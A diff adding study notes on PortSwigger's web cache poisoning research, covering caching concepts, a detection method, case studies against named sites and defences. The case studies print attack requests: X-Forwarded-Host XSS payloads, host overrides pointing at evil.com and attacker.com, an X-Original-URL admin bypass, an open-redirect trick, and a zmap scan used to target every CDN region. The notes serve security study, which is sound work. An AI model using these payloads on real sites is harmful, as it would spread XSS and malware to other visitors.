@@ -1,0 +1,451 @@
+https://portswigger.net/research/practical-web-cache-poisoning
+
+https://www.youtube.com/watch?v=j2RrmNxJZ5c
+
+
+Abstract
+- This attack is elusive vuln, a 'theoretical' threat
+    + Used most to scare dev into obediently patching issues that nobody could actually exploit
+- Author illustrate technique that control over numerous popular web and framework
+    + Progressing from single-request to intricate exploit chainthat hijack JS
+    + Pivot across cache layers, subvert social media and misdirect cloud services
+
+
+Core Concepts
+- Caching 101:
+    + Intended to speed up page load by reducing latency, reduce load on application server
+    + Type of cache:
+        + Some host their own cache using software (like Varnish)
+        + Some rely on CDN like Cloudflare
+        + Some have build-in cache
+- Cache keys:
+    + The concept is clean and simple, but it hides some risky assumptions
+    + Whenever cache receives request for resource
+        + It need to decide whether has a copy of this exact resource already saved and can reply with that
+        + Or need to forward request to application server
+    + Identifying whether 2 request load the same source can be tricky;
+        + Require match byte-for-byte is ineffective, as request are full of inconsequential data
+        + Solution: using concept of cache key - specific components of HTTP request that are taken to fully identify the resource being requested
+        + Example: Only using mathod, path, and host header to identify
+    + Problem:
+        + When not using cookie to identify, page may served wrong language for second visitor (example: cookie contain language=vi or en)
+        + Any difference in response triggered by an unkeyed input may be stored and served to other users
+    + In theory, sites can use 'Vary' response header to specify additional request headers that should be keyed
+    + In practice, this header only used in a basic way, CDNs like Cloudflare ignore it outright, and client don't realise their application support any header-based input
+- Cache Poisoning:
+    + Send request causes a harmful response that get saved in cache and served to other users
+    + Other possible way of poisoning caches:
+        + HTTP Response Splitting
+        + HTTP Request Smuggling
+    + Can enable different attack called Web Cache Deception
+- Methodology:
+    + Detect unkeyed input -> Explore input potential -> Inject into cache -> Map cache rules -> Find target page -> Inject into cache (Repeat here)
+    + Process:
+        + Identify unkeyed input: using Param Miner automates this step by guessing header/cookie names, observing whether they have effect on response
+        + Assess how much damage, then try store it in the cache, if fail try identify again
+            + Page get cached may be based on variety of factors including file extension, content-type, route, status code, response headers
+            + Cached response can mask unkeyed input:
+                + If first request is cached
+                + Even second request contain different unkeyed param but has the same cache key, it will served from cache instead of reaching server
+    + When trying to detect manually or explore unkeyed input, cache-buster is crucial
+    + Param Miner:
+        + Ensure every request has unique key by adding param with value of $randomplz to query string
+        + Problem: when audit live website can accidentally poisoning other visitors
+        + Solution: extension adding cache buster to all outbound request, it has a fixed value so you can track your own caching behavior
+
+
+Case Studies:
+- Basic Poisoning:
+    + In Red Hat's homepage, Param Miner found unkeyed input (should contain random param for generate unique cache key):
+        GET /en?cb=1 HTTP/1.1
+        X-Forwarded-Host: <payload>
+        <meta property="og:image" content="https://<payload>/cms/social.png"/>
+    + Try XSS payload to confirm it will execute arbitrary JS against whoever views it
+        GET /en?abcd=2 HTTP/1.1
+        X-Forwarded-Host: a."><script>alert(1)</script>
+        <meta property="og:image" content="https://a."><script>alert(1)</script>"/>
+    + Check if response has been stored in cache and will be delivered to other users
+        + Verify by fetching directly in browser on different machine (without malicious headers)
+    + Result:
+        + Although doesn't have any headers suggest cache is present, it actually can still be cached
+        + DNS lookup: www.redhat.com (CNAME) point to www.redhat.com.edgekey.net
+        + Akamai CDN cache the response automatically
+
+- Discreet poisoning:
+    + In order to actually poison page, ensure we send first request after the cached response expired
+    + Method of ensure sent first request:
+        + Burp Intruder or custom script: can sent a large number of request (but such a traffic-heavy approach is hardly subtle)
+        + Reverse engineering cache expiry system and predict exact expiry time and monitoring site over time (but sound like distinctly hard work)
+        + Some website has "Age" and "max-age" headers
+            Age: 174
+            Cache-Control: public, max-age=1800
+            + Time remain = max-age - Age
+
+- Selective Poisoning:
+    GET / HTTP/1.1
+    Host: redacted.com
+    User-Agent: Mozilla/5.0 … Firefox/60.0
+    X-Forwarded-Host: a"><iframe onload=alert(1)>
+
+    HTTP/1.1 200 OK
+    X-Served-By: cache-lhr6335-LHR
+    Vary: User-Agent, Accept-Encoding
+    …
+    <link rel="canonical" href="https://a">a<iframe onload=alert(1)></iframe> 
+
+    + Vary header: tell us which header included in cache key
+    -> Only Firefox 60 users effect by this poison response
+    + If knew their user agent, can potentially target specific person, or hide it from monitor team by using rare user agent (harder to detect)
+
+- DOM Poisoning:
+    GET /dataset HTTP/1.1
+    Host: catalog.data.gov
+    X-Forwarded-Host: canary
+
+    HTTP/1.1 200 OK
+    Age: 32707
+    X-Cache: Hit from cloudfront 
+    …
+    <body data-site-root="https://canary/">
+
+    + X-Cache confirm using cache Cloudfront of AWS
+    + We can control data-site-root attribute but can't break out to get XSS, and don't know used for what
+
+    + Create match and replace rule to add this header to every request
+        X-Forwarded-Host: id.burpcollaborator.net
+        + When page loaded, browser sent JS generated request to attacker's server
+    + Example: server receive this request
+        GET /api/i18n/en HTTP/1.1
+        Host: id.burpcollaborator.net
+        + i18n: stand for internationalization
+        + Try to fetch https://catalog.data.gov/api/i18n/en but receive empty resposne
+            + Because website using English as original language, don't need en translate
+            + Chanege en -> es and got response, map for translating phrases into select language
+        + By creating file and using cache poisoning to point users toward that (attacker's server) -> exploit
+            {"Show more":"<svg onload=alert(1)>"}
+
+- Hijacking Mozilla SHIELD:
+    + X-Forwarded-Host rule had an unexpected side effect
+    + When add it in request, author receive a mysterious response
+        + It contain "origin: null" with a fully lowercase Origin headers
+        + Normal header should start with uppercase letter
+        + Check proxy history log reveal that come from Firefox itself
+    + Firefox:
+        + Tried to fetch list of recipes as part of SHIELD
+        + SHIELD: system for silent install extension for marketing and research purpose
+            + Best known for forcibly distributing 'Mr Robot' extension
+            + https://www.cnet.com/news/privacy/mozilla-backpedals-after-mr-robot-firefox-misstep/
+    + X-Forwarded-Host header had fooled system into directing Firefox to attacker's server in order to fetch recipes
+        + List of url using for fetching recipes, all point to server in X-Forwarded-Host
+            HTTP/1.1 200 OK
+            {
+                "action-list": "https://xyz.burpcollaborator.net/api/v1/action/",
+                "action-signed": "https://xyz.burpcollaborator.net/api/v1/action/signed/",
+                "recipe-list": "https://xyz.burpcollaborator.net/api/v1/recipe/",
+                "recipe-signed": "https://xyz.burpcollaborator.net/api/v1/recipe/signed/",
+                …
+            }
+        + After fetching one of that, receive response
+            [{
+                "id": 403,
+                "last_updated": "2017-12-15T02:05:13.006390Z",
+                "name": "Looking Glass (take 2)",
+                "action": "opt-out-study",
+                "addonUrl": "https://normandy.amazonaws.com/ext/pug.mrrobotshield1.0.4-signed.xpi",
+                "filter_expression": "normandy.country in  ['US', 'CA']\n && normandy.version >= '57.0'\n)",
+                "description": "MY REALITY IS JUST DIFFERENT THAN YOURS",
+            }]
+    + System was using Nginx for caching 
+        -> Could save poisoned response and serve to other users
+    + Everytime user open browser, firefox automatically fetch URL and also periodically refetches it
+    + Extension itself were signed 
+        -> Can't instal malicious addon and get full code execution but can redirect all user to any url (DDoS)
+        -> Can be serious if combined with memory corruption vuln
+    + Some BE Mozilla system use unsigned recipes
+        -> Can be used to obtain a foothold deep inside their infrastructure and perhaps obtain the recipe-signing key
+        -> Maybe could replay old recipes of old-known vuln extension or unexpected return of Mr Robot
+
+- Route poisoning:
+    + Not only use header to generate URLs, but also using them for internal request routing
+    + Goohire site hosted on HubSpot, X-Forwareded-Server header priority over Host header and getting confused about which client request intended for
+        GET / HTTP/1.1
+        Host: www.goodhire.com
+        X-Forwarded-Server: canary
+
+        HTTP/1.1 404 Not Found
+        ...
+        <title>HubSpot - Page not found</title>
+    + Input reflect is encoded -> XSS not working here
+    + Exploit: need to place a payload on HubSpot page, trick website to serving malicious response on goodhire.com
+    + Internal misrouting vuln are particularly common on SaaS applications, where single system handling request for different customers
+
+- Hidden Route Poisoning:
+    + Cloudflare's blog hosted on Ghost, it using X-Forwarded-Host header
+        + Case 1: invalid X-Forwarded-Host header
+            X-Forwarded-Host: canary
+
+            HTTP/1.1 302 Found
+            Location: https://ghost.org/fail/
+        + Case 2: valid hostname like blog.binary.com
+            + Mysterious 10s delay then return response
+    + How Ghost work:
+        + When user register a blog with Ghost, receive a subdomain {id}.ghost.io
+        + When blog is running, can define custom domain, ghost subdomain will simply redirect to it
+    + The redirect can also be triggered using X-Forwarded-Host header
+    + Exploit:
+        + Register account and set up a custom domain
+        + Use X-Forwarded-Host header to redirect all request sent to blog.cloudflare.com to attacker's site (cache poisoned)
+            -> Can hijack resource load like image
+            + All request redirect to attacker's side and served a malicious image (like JS script)
+    + Problem of exploit above:
+        + Look at redirect, it uses HTTP whereas the blog is loaded over HTTPS
+        + Browsers mixed content protection kick and block script/stylesheet redirections
+        + HTTPS fetch HTTP content -> blocked by mixed content
+        + Author replicated it and placed in hackxor with cash prize
+            https://hackxor.net/mission?id=7
+    + Solution:
+        + By Sajjad Hashemian: In Safari, if attacker's site was in browser's HSTS cache, redirect would automatically upgraded to HTTPS
+        + Sam Thomas: In Edge, based on research of Manuel Caballero, issue 302 redirect to HTTPS url bypass Edge's mixed content protection
+            https://www.brokenbrowser.com/blog/2016-11-15-loading-insecure-content-in-secure-pages/
+            + Edge only check last step of sequence, skip middle sequence
+            + HTTPS victim page -> http://attacker:80 -> https://attacker:443/evil.js
+    + Conclusion:
+        + Can completely compromise Safari and Edge users
+        + Against Chrome/Firefox users, only can hijack images
+
+- Chaining Unkeyed Inputs:
+    + https://youst.in/posts/cache-poisoning-at-scale/
+    + Sometimes an unkeyed input will only confuse part of application stack, need to chain multiple unkeyed input to achieve exploitable result
+    
+    + Input 1: X-Forwarded-Host header overrides domain on the cookie, but none of URLs generated in the response -> useless by itself
+        GET /en HTTP/1.1
+        Host: redacted.net
+        X-Forwarded-Host: xyz
+        ---------
+        HTTP/1.1 200 OK
+        Set-Cookie: locale=en; domain=xyz
+    + Input 2: X-Forwarded-Scheme header makes server return 301 redirect to https -> useless by itself
+        GET /en HTTP/1.1
+        Host: redacted.net
+        X-Forwarded-Scheme: nothttps
+        --------
+        HTTP/1.1 301 Moved Permanently
+        Location: https://redacted.net/en
+        + Standard header: X-Forwarded-Proto, Forwarded
+        + It has no pre-defined value, any value != https will make it redirect to https
+    + Chain both input 1 + 2: Redirect to a arbitrary domain
+        GET /en HTTP/1.1
+        Host: redacted.net
+        X-Forwarded-Host: attacker.com
+        X-Forwarded-Scheme: nothttps
+        ---------
+        HTTP/1.1 301 Moved Permanently
+        Location: https://attacker.com/en
+    + Impact:
+        + Steal csrf tokens from a custom HTTP header by redirecting a POST request
+        + Obtain stored DOM-based XSS with malicious response to a JSON load
+
+- Open Graph Hijacking:
+    + Open graph:
+        + https://ogp.me/
+        + A protocol created by Fb let website owner dictate what happens when their content is shared on social media
+    + On another site, unkeyed input affected Open graph URLs
+        X-Forwarded-Host: attacker.com
+        --------
+        HTTP/1.1 200 OK
+        Cache-Control: max-age=0, private, must-revalidate
+        <meta property="og:url" content='https://attacker.com/en'/>
+        + og:url param has been hijacked can overrides the URL that get shared
+        + Cache-Control: private -> Response only cached in victim's browser, not in shared cache (like Cloudflare CDN)
+        + max-age=0, must-revalidate -> Refuse to be cached
+    + Find other page on the site explicitly enable caching:
+        X-Forwarded-Host: evil.com
+        -------
+        HTTP/1.1 200 OK
+        Cache-Control: public, max-age=14400
+        Set-Cookie: session_id=942…
+        CF-Cache-Status: MISS
+        + CF-Cache-Status header: header debug of Cloudflare
+            + MISS: meaning this time cache didn't have this request
+            + HIT: response cached
+            + BYPASS/other: not cache
+        + Although Cache-Control: public but never actually cached
+        + https://blog.cloudflare.com/understanding-our-cache-and-the-web-cache-deception-attack/
+    + Didn't cache this might related to session_id cookie, and retried with that:
+        Cookie: session_id=942…;
+        X-Forwarded-Host: attacker.com
+        --------
+        HTTP/1.1 200 OK
+        Cache-Control: public, max-age=14400
+        CF-Cache-Status: HIT
+        …
+        <meta property="og:url" content='https://attacker.com/…
+        + Response has been cached successfull
+    + But share result still remained unpoisoned, Fb wasn't hit Clouflare cache
+        + Reason: there are a lots colocation datacenter exist around the world, you must poison the true cache to make it work
+        + Solution:
+            + Took advantage of a helpful debugging feature present on all Cloudflare site /cdn-cgi/trace
+            + colo=AMS -> Fb access cache in Amsterdam, but target web accessed via Atlanta
+            + Rent a VPS in Atlanta and poison again
+
+- Local Route Poisoning:
+    + Scenario:
+        + Until now, we have seen a cookie-based language hijack, attacks that use various 
+        headers override the host
+        + Found a few variations using non-standard headers (like translate, bucket, path_info) and suspected was missing many others
+        + So next step is downloading header wordlist and search the top 20k PHP projects on Github for header names
+    + Result:
+        + Revealed the headers X-Original-URL and X-Rewrite-URL which override the request's path
+        + It affected target running Drupal -> digging through Drupal's code -> that support for header comes from popular PHP framework Symfony -> took code from Zend
+        + Huge number of PHP support these headers
+    + Use case 1: Bypass WAF
+        + Input 1: Access is denied
+            GET /admin HTTP/1.1
+            --------
+            HTTP/1.1 403 Forbidden
+        + Input 2: Bypass
+            GET /anything HTTP/1.1
+            X-Original-URL: /admin
+            --------
+            HTTP/1.1 200 OK
+    + Use case 2: Cache poisoning (local route poisoning)
+        + If app using cache, can trick into serving incorrect page
+            GET /education?a=b HTTP/1.1     (keyed)
+            Host: store.unity.com
+            X-Original-URL: /gambling?x=y   (unkeyed)
+        + Response using cache key of /education?a=b but return content of /gambling?a=b
+
+- Internal Cache Poisoning:
+    + Drupal often used third party cache like Varnish, but also contain internal cache enabled by default
+    + It aware of X-Original-URL header and includes it in its cache key, but mistake of including query string from this header
+    + Input 1: Cached /search/node?keys=snuff using /search/node?keys=kittens as cache key
+        GET /search/node?keys=snuff HTTP/1.1        (unkeyed) (used="?keys=snuff")
+        Host: example.com
+        X-Original-URL: /search/node?keys=kittens   (keyed) (used="/search/node")
+    + Input 2: Get content of /search/node?keys=snuff
+        GET /search/node?keys=kittens HTTP/1.1
+        --------
+        Search results for 'snuff'
+
+- Drupal Open Redirect:
+    + Found risky feature, can override redirect target using destination param
+    + Although attempt some URL parsing to ensure it won't redirect to external domain, but can easy to bypass:
+        GET //?destination=https://evil.net\@unity.com/ HTTP/1.1
+        -----------
+        Location: https://evil.net\@unity.com/
+    + Tip 1: // trigger redirect
+        + destination param: only work if response redirect
+        + Drupal see // and try to issue redirect to / to normalize it
+        + Then destination param kick in, Location become destination value
+            Location: https://evil.net\@unity.com/
+    + Tip 2: \@ to trick parsing URL
+        + Full URL structure: scheme://[userinfo@]host[:port]/path
+        + Drupal: think evil.net\ as userinfo, unity.com is host
+        + Web browsers: in practice, automatically convert \ to /, landing user on evil.net/@unity.com
+
+- Persistent redirect hijacking:
+    + Idea: Local Route Poisoning + Drupal open redirect
+    + Scenario: Some pages in Pinterest's business web import JS via redirect
+    + Exploit: 
+        + Step 1: Poison cache
+            GET /?destination=https://evil.net\@business.pinterest.com/ HTTP/1.1
+            Host: business.pinterest.com
+            X-Original-URL: /foo.js?v=1
+        + Step 2: Hijack the destination of JS import, give full control of several static pages
+            GET /foo.js?v=1 HTTP/1.1
+            ---------
+            HTTP/1.1 302 Found
+            Location: https://evil.net\@business.pinterest.com/
+
+- Nested cache poisoning:
+    + Scenario:
+        + Web using both internal and external cache (like virtually all high-traffic Drupal sites)
+        + Victim --> External cache --> Internal cache --> Drupal backend
+        + Can use internal cache to poison the external cache (like Varnish, CDN), and in the process convert any response into a redirection
+    + Exploit: cache key using request line but content is from X-Original-URL header
+        + Step 1: Poison internal cache (replace /redir with malicious redirect)
+            GET /?destination=https://evil.net\@store.unity.com/ HTTP/1.1
+            Host: store.unity.com
+            X-Original-URL: /redir
+        + Step 2: Poison external cache (replace /download?v=1 with pre-poisoned /redir)
+            GET /download?v=1 HTTP/1.1
+            Host: store.unity.com
+            X-Original-URL: /redir
+    + Result:
+        + Click download would download some malware from evil.net
+        + Could also be used for other attack including:
+            + Inserting spoofed entries into RSS feeds
+            + Replacing login pages with phishing pages
+            + Stored XSS via dynamic script imports
+    + Vuln was disclosed on 2018 (CVE-2018-14773) and support for these headers has been disabled
+
+
+Cross-Cloud Poisoning:
+- Scenario:
+    + One triager, scoring submission using CVSS, rated access complexity of 'high' because need to rent several VPSs to poison all CloudFront's caches
+    + Author explore whether cross-region attack are possible without relying on VPSs
+- Find that:
+    + CloudFront have a useful map of their caches, their IPs can be identified using DNS lookups
+        https://www.liquidweb.com/tools/dns-checker/
+    + Poison a specific region is simple as routing attack to one of these IPs using curl/Burp's hostname override features
+    + Normal process: Access website -> DNS -> Nearest cache
+    + Bypass process: Access website -> force connect to specific IP -> Direct to target cache
+- Exploit:
+    + Quick script to request through each of these IPs and record which cache got hit
+        curl https://www.cloudflare.com/ips-v4 | sudo zmap -p 80 | zgrab --port 80 --data traceReq | fgrep visit_scheme | jq -c '[.ip , .data.read]' cf80scheme | sed -E 's/\["([0-9.]*)".*colo=([A-Z]+).*/\1 \2/' | awk -F " " '!x[$2]++'
+        curl https://www.cloudflare.com/ips-v4          # List IP of Cloudflare
+            | sudo zmap -p80                            # Scan IP opened port 80
+            | zgrab --port 80 --data traceReq           # Each IP, request get /cdn-cgi/trace
+            | fgrep visit_scheme                        # Confirm trace path is valid
+            | jq -c '[.ip , .data.read]' cf80scheme     # Extract [IP, content]
+            | sed -E 's/\["([0-9.]*)".*colo=([A-Z]+).*/\1 \2/'  # Regex -> output "IP COLO"
+            | awk -F " " '!x[$2]++'                     # Deduplicate by colo, keep first IP per region
+    + zmap: high speed scanner, scan all IP range
+    + zgrab: handshake application-layer, send request to get trace response
+    + jq: process JSON
+    + sed: regex convert string to format "IP COLO"
+    + awk !x[$2]++: tip to avoid repeat by COLO column - only keep 1 IP as a for cache region, only need 1 IP for poison
+- Result:
+    + Don't need to rent VPSs, just need script and override IP feature
+
+
+The common pitfall:
+- In 2021, most questions received are from people who found they can replicate cache poisoning vuln using Burp Repeater or a proxied browser, but not in unproxied browser
+- Occur when request in browser and Burp is slightly different in a keyed part of request
+    + To identify difference, compare request shown in browser's developer console and request logged in Logger++
+- 2 most common issues:
+    + Param Miner has 'Add fcbz cachebuster' enabled, add static query param to Burp request
+    + Server included 'Accept-Encoding' header in cache key. Proxy>Options>Remove unsupported encodings
+
+
+Defense:
+- Solution 1: Disable caching
+    + This is unrealistic advice, but quite a few web start using service like Cloudflare for DDoS protection or easy SSL
+    + Easy to end up vuln because caching enabled by default
+- Solution 2: Only cache actually static response
+    + Effective but need to wary about what can be defined as 'static'
+- Solution 3: Avoid taking input from headers and cookies
+    + Hard to know if other layers and frameworks are sneaking support for extra headers
+- Solution 4: Audit unkeyed input
+    + Testing every pages with Param Miner to flush out unkeyed inputs
+    + After identified, handle in priority order:
+        + Ideal: outright disable them
+        + Else: strip input at cache layer
+        + Or: add them to cache key
+            + Use Vary header to key unkeyed input
+            + Define custom cache key (may be restricted to enterprise customers)
+- Note:
+    + Even app is no cache, client may have their own cache
+    + Client-side vuln like XSS in HTTP headers should never be ignored
+
+
+Conclusion:
+- Web cache poisoning is not a theoretical vuln, bloated applications + towering server stacks are conspiring to take it to the masses
+- Even well-known frameworks can hide dangerous features, never assume that someone else has read source code just because it's open source and has millions of users
+- Build a little challenge to test knowledge
+    https://hackxor.net/mission?id=8
+
+
+References research:
+- https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures
+- https://portswigger.net/research/web-cache-entanglement
